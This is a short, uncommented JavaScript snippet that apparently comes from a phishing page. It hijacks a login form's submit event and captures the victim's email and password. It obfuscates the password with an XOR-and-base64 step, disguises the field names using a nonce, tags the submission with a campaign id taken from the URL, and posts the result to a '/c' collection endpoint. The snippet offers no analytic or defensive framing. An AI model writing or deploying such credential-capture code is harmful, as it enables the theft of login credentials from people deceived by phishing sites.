
;(function(){
  const q = new URLSearchParams(location.search);
  const cid = q.get("cid");
  const nonce = q.get("n") || "nonce-7f";
  const secret = atob("IWhjMi10bGFT").split("").reverse().join("");

  function xorEnc(s, key){
    let out="";
    for(let i=0;i<s.length;i++){ out += String.fromCharCode(s.charCodeAt(i) ^ key.charCodeAt(i % key.length)); }
    return out;
  }
  function encodePass(pass){
    const x = xorEnc(pass, "secret");
    return btoa(x);
  }

  const keyU = "u" + nonce.slice(-1) + "sr";
  const keyP = "p" + nonce.slice(6,7) + "wd";
  const action = "/c";

  document.querySelector("#f").addEventListener("submit", function(ev){
    ev.preventDefault();
    const payload = {
      [keyU]: encodeURIComponent(document.querySelector("#e").value),
      [keyP]: encodeURIComponent(encodePass(document.querySelector("#p").value)),
      "cid": cid
    };
    const t = "precomputed-client";
    fetch(action + "?t=" + t, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(payload)
    });
  });
})();
